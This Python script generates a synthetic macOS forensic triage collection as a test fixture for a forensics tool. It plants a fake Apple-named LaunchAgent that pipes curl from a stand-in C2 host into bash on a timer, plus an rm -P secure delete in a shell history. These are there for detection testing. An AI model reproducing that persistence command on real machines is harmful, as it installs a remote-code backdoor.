#!/usr/bin/env python3
"""A macOS triage collection as UAC packs one (tests/fixtures/collection-uac-mac.tar.gz):
collected files under [root]/, uac.log, live_response/.

The Mac (invented lab data: LAB-MAC, alice, .test domains):
  - macOS 14.4.1 (23E224), named LAB-MAC, set up 2026-10-01, time zone
    Europe/Skopje (/private/etc/localtime links into zoneinfo)
  - accounts in dslocal: root, alice (admin, uid 501), bob (uid 502), and
    _spotlight (an Apple service account, not listed)
  - LaunchAgents: Apple-like updater in /Library/LaunchAgents, and in
    alice's home a hidden job that runs curl through bash (flagged)
  - quarantine events: Safari downloaded tools.dmg, Mail saved invoice.pdf
  - KnowledgeC: Safari and Terminal in front, with durations
  - alice's .zsh_history with an rm -P (secure delete) of a file
  - Safari: History.db (three visits, one a search, and a page whose visits
    are gone) and Downloads.plist (tools.dmg)
  - FSEvents: one gzip batch (version 2 pages) with plan.txt created,
    modified and removed, and a renamed folder

Property lists are written with plistlib (binary and XML), databases with
sqlite3, so they are what macOS writes as far as Kokino reads them.
Usage: python scripts/make_mac_collection.py
"""

import gzip
import io
import os
import plistlib
import sqlite3
import struct
import tarfile
import tempfile
from datetime import datetime, timezone

OUT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "tests", "fixtures", "collection-uac-mac.tar.gz")
T0 = 1792483530  # 2026-10-20 08:05:30 UTC
MAC = 978307200  # 2001-01-01 in Unix time


def mac(t):
    return float(t - MAC)


def quarantine():
    with tempfile.TemporaryDirectory() as d:
        p = os.path.join(d, "q.db")
        c = sqlite3.connect(p)
        c.execute("CREATE TABLE LSQuarantineEvent (LSQuarantineEventIdentifier TEXT PRIMARY KEY NOT NULL, LSQuarantineTimeStamp REAL, LSQuarantineAgentBundleIdentifier TEXT, LSQuarantineAgentName TEXT, LSQuarantineDataURLString TEXT, LSQuarantineSenderName TEXT, LSQuarantineSenderAddress TEXT, LSQuarantineTypeNumber INTEGER, LSQuarantineOriginTitle TEXT, LSQuarantineOriginURLString TEXT, LSQuarantineOriginAlias BLOB)")
        rows = [
            ("8F1E2D3C-0000-4000-8000-000000000001", mac(T0 + 600), "com.apple.Safari", "Safari", "https://downloads.lab.test/tools.dmg", None, None, 0, None, "https://lab.test/tools"),
            ("8F1E2D3C-0000-4000-8000-000000000002", mac(T0 + 1200), "com.apple.mail", "Mail", "", "Lab Billing", "billing@lab.test", 0, None, None),
        ]
        c.executemany("INSERT INTO LSQuarantineEvent (LSQuarantineEventIdentifier, LSQuarantineTimeStamp, LSQuarantineAgentBundleIdentifier, LSQuarantineAgentName, LSQuarantineDataURLString, LSQuarantineSenderName, LSQuarantineSenderAddress, LSQuarantineTypeNumber, LSQuarantineOriginTitle, LSQuarantineOriginURLString) VALUES (?,?,?,?,?,?,?,?,?,?)", rows)
        c.commit()
        c.close()
        return open(p, "rb").read()


def knowledge():
    with tempfile.TemporaryDirectory() as d:
        p = os.path.join(d, "k.db")
        c = sqlite3.connect(p)
        c.execute("CREATE TABLE ZOBJECT (Z_PK INTEGER PRIMARY KEY, ZSTREAMNAME VARCHAR, ZVALUESTRING VARCHAR, ZSTARTDATE TIMESTAMP, ZENDDATE TIMESTAMP, ZCREATIONDATE TIMESTAMP)")
        rows = [
            ("/app/inFocus", "com.apple.Safari", mac(T0 + 500), mac(T0 + 1100)),
            ("/app/inFocus", "com.apple.Terminal", mac(T0 + 7300), mac(T0 + 7690)),
            ("/device/isLocked", None, mac(T0 + 8000), mac(T0 + 9000)),
        ]
        c.executemany("INSERT INTO ZOBJECT (ZSTREAMNAME, ZVALUESTRING, ZSTARTDATE, ZENDDATE, ZCREATIONDATE) VALUES (?,?,?,?,?3)", rows)
        c.commit()
        c.close()
        return open(p, "rb").read()


def safari():
    with tempfile.TemporaryDirectory() as d:
        p = os.path.join(d, "h.db")
        c = sqlite3.connect(p)
        c.execute("CREATE TABLE history_items (id INTEGER PRIMARY KEY AUTOINCREMENT, url TEXT NOT NULL UNIQUE, domain_expansion TEXT NULL, visit_count INTEGER NOT NULL, daily_visit_counts BLOB NOT NULL, weekly_visit_counts BLOB NULL, autocomplete_triggers BLOB NULL, should_recompute_derived_visit_counts INTEGER NOT NULL, visit_count_score INTEGER NOT NULL)")
        c.execute("CREATE TABLE history_visits (id INTEGER PRIMARY KEY AUTOINCREMENT, history_item INTEGER NOT NULL REFERENCES history_items(id) ON DELETE CASCADE, visit_time REAL NOT NULL, title TEXT NULL, load_successful BOOLEAN NOT NULL DEFAULT 1, http_non_get BOOLEAN NOT NULL DEFAULT 0, synthesized BOOLEAN NOT NULL DEFAULT 0, redirect_source INTEGER NULL UNIQUE REFERENCES history_visits(id) ON DELETE CASCADE, redirect_destination INTEGER NULL UNIQUE REFERENCES history_visits(id) ON DELETE CASCADE, origin INTEGER NOT NULL DEFAULT 0, generation INTEGER NOT NULL DEFAULT 0, attributes INTEGER NOT NULL DEFAULT 0, score INTEGER NOT NULL DEFAULT 0)")
        items = [
            (1, "https://www.google.com/search?q=how+to+wipe+a+mac", "google", 1),
            (2, "https://lab.test/tools", "lab", 1),
            (3, "https://downloads.lab.test/tools.dmg", "lab", 1),
            (4, "https://old.lab.test/forgotten", "lab", 3),
        ]
        c.executemany("INSERT INTO history_items (id, url, domain_expansion, visit_count, daily_visit_counts, should_recompute_derived_visit_counts, visit_count_score) VALUES (?,?,?,?,x'',0,0)", items)
        visits = [(1, mac(T0 + 400), "how to wipe a mac - Google Search"), (2, mac(T0 + 550), "Lab tools"), (3, mac(T0 + 600), None)]
        c.executemany("INSERT INTO history_visits (history_item, visit_time, title) VALUES (?,?,?)", visits)
        c.commit()
        c.close()
        return open(p, "rb").read()


def fsevents():
    """One FSEvents batch, gzip, version 2 pages (High Sierra and later)."""
    def page(recs):
        body = b""
        for path, eid, flags, node in recs:
            body += path.encode() + b"\0" + struct.pack("<Q", eid) + struct.pack(">I", flags) + struct.pack("<Q", node)
        return b"2SLD" + struct.pack("<I", 0) + struct.pack("<I", len(body) + 12) + body
    recs = [
        ("Users/alice/Documents/plan.txt", 0xA1B2C0, 0x01008000 | 0x10000000, 9001),
        ("Users/alice/Documents/plan.txt", 0xA1B2C1, 0x02008000, 9001),
        ("Users/alice/Projects/old-name", 0xA1B2C2, 0x08000001, 9002),
        ("Users/alice/Projects/new-name", 0xA1B2C3, 0x08000001, 9002),
    ]
    return gzip.compress(page(recs[:2]) + page(recs[2:]), mtime=0)


def tree():
    user = lambda name, uid, real, shell="/bin/zsh": plistlib.dumps({
        "name": [name], "uid": [str(uid)], "gid": ["20"], "realname": [real], "home": ["/Users/" + name],
        "shell": [shell], "generateduid": ["00000000-0000-4000-8000-%012d" % uid], "ShadowHashData": [b"lab"],
    }, fmt=plistlib.FMT_BINARY)
    return {
        "/System/Library/CoreServices/SystemVersion.plist": plistlib.dumps({"ProductName": "macOS", "ProductVersion": "14.4.1", "ProductBuildVersion": "23E224", "ProductCopyright": "1983-2024 Apple Inc."}),
        "/Library/Preferences/SystemConfiguration/preferences.plist": plistlib.dumps({"System": {"System": {"ComputerName": "LAB-MAC", "HostName": "lab-mac"}, "Network": {"HostNames": {"LocalHostName": "LAB-MAC"}}}}, fmt=plistlib.FMT_BINARY),
        "/private/var/db/.AppleSetupDone": (b"", T0 - 19 * 86400),
        "/private/etc/localtime": ("link", "/var/db/timezone/zoneinfo/Europe/Skopje"),
        "/private/etc/passwd": "nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false\nroot:*:0:0:System Administrator:/var/root:/bin/sh\ndaemon:*:1:1:System Services:/var/root:/usr/bin/false\n",
        "/private/var/db/dslocal/nodes/Default/users/root.plist": user("root", 0, "System Administrator", "/bin/sh"),
        "/private/var/db/dslocal/nodes/Default/users/alice.plist": user("alice", 501, "Alice Lab"),
        "/private/var/db/dslocal/nodes/Default/users/bob.plist": user("bob", 502, "Bob Lab"),
        "/private/var/db/dslocal/nodes/Default/users/_spotlight.plist": user("_spotlight", 89, "Spotlight", "/usr/bin/false"),
        "/private/var/db/dslocal/nodes/Default/groups/admin.plist": plistlib.dumps({"name": ["admin"], "gid": ["80"], "users": ["root", "alice"]}, fmt=plistlib.FMT_BINARY),
        "/Library/LaunchAgents/com.lab.updater.plist": plistlib.dumps({"Label": "com.lab.updater", "ProgramArguments": ["/Applications/LabUpdater.app/Contents/MacOS/updater", "--check"], "RunAtLoad": True}),
        "/Users/alice/Library/LaunchAgents/com.apple.sysmond.plist": plistlib.dumps({"Label": "com.apple.sysmond", "ProgramArguments": ["/bin/bash", "-c", "curl -s https://c2.lab.test/a | bash"], "RunAtLoad": True, "StartInterval": 600}, fmt=plistlib.FMT_BINARY),
        "/Users/alice/Library/Preferences/com.apple.LaunchServices.QuarantineEventsV2": quarantine(),
        "/Users/alice/Library/Application Support/Knowledge/knowledgeC.db": knowledge(),
        "/Users/alice/Library/Safari/History.db": safari(),
        "/Users/alice/Library/Safari/Downloads.plist": plistlib.dumps({"DownloadHistory": [{
            "DownloadEntryURL": "https://downloads.lab.test/tools.dmg", "DownloadEntryPath": "~/Downloads/tools.dmg",
            "DownloadEntryDateAddedKey": datetime.fromtimestamp(T0 + 600, timezone.utc).replace(tzinfo=None),
            "DownloadEntryDateFinishedKey": datetime.fromtimestamp(T0 + 610, timezone.utc).replace(tzinfo=None),
            "DownloadEntryProgressBytesSoFar": 52428800, "DownloadEntryProgressTotalToLoad": 52428800,
            "DownloadEntryIdentifier": "8F1E2D3C-0000-4000-8000-0000000000AA"}]}, fmt=plistlib.FMT_BINARY),
        "/.fseventsd/0000000000a1b2c3": (fsevents(), T0 + 9000),
        "/Users/alice/.zsh_history": ": %d:0;ls -la\n: %d:0;hdiutil attach ~/Downloads/tools.dmg\n: %d:0;rm -P ~/Documents/plan.txt\n" % (T0 + 7300, T0 + 7350, T0 + 7400),
    }


def build():
    raw = io.BytesIO()
    with tarfile.open(fileobj=raw, mode="w", format=tarfile.PAX_FORMAT) as t:
        def add(name, data=b"", mtime=T0, kind=tarfile.REGTYPE, link="", mode=0o644):
            ti = tarfile.TarInfo(name)
            ti.type, ti.mtime, ti.mode, ti.linkname = kind, mtime, mode, link
            ti.uid = ti.gid = 0
            if kind == tarfile.REGTYPE:
                ti.size = len(data)
                t.addfile(ti, io.BytesIO(data))
            else:
                t.addfile(ti)
        add("[root]", kind=tarfile.DIRTYPE, mode=0o755)
        tr = tree()
        for p in sorted(tr):
            v = tr[p]
            mtime = T0
            if isinstance(v, tuple) and v[0] == "link":
                add("[root]" + p, kind=tarfile.SYMTYPE, link=v[1], mode=0o755)
                continue
            if isinstance(v, tuple):
                v, mtime = v
            add("[root]" + p, v.encode() if isinstance(v, str) else v, mtime)
        add("live_response/system/sw_vers.txt", b"ProductName:\tmacOS\nProductVersion:\t14.4.1\nBuildVersion:\t23E224\n")
        add("uac.log", b"2026-10-21 02:30:00 INFO UAC (Unix-like Artifacts Collector) lab run on LAB-MAC\n")
    with open(OUT, "wb") as f:
        with gzip.GzipFile(fileobj=f, mode="wb", mtime=0, filename="") as g:
            g.write(raw.getvalue())
    print("wrote", os.path.basename(OUT), os.path.getsize(OUT), "bytes")


if __name__ == "__main__":
    build()
